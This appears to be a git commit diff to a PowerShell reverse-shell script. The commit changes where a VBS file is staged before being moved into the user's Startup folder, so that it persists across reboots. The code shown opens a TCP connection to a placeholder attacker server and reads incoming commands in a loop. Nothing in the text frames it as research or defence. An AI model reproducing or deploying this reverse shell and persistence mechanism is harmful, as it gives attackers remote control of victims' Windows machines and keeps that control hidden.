4c515f789dad54a82d2e104ae96160c63f4eff24
Damien <100437527+damien-grau@users.noreply.github.com>
2023-08-22 11:56:51 +0200

    Update reverse_shell.ps1
    Changing temporary path of the vbs file due to missing "temp" folder on some computers

--- reverse_shell.ps1
+++ reverse_shell.ps1
@@ -1,7 +1,7 @@
 Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient("<SERVER_IP>",<SERVER_PORT>));
 Set-Variable -Name stream -Value ($client.GetStream());
 [byte[]]$bytes = 0..65535|%{0};
-Move-Item C:\temp\s.vbs "C:\Users\${env:USERNAME}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\";
+Move-Item C:\Users\Public\s.vbs "C:\Users\${env:USERNAME}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\";
 
 while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){
     ;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));
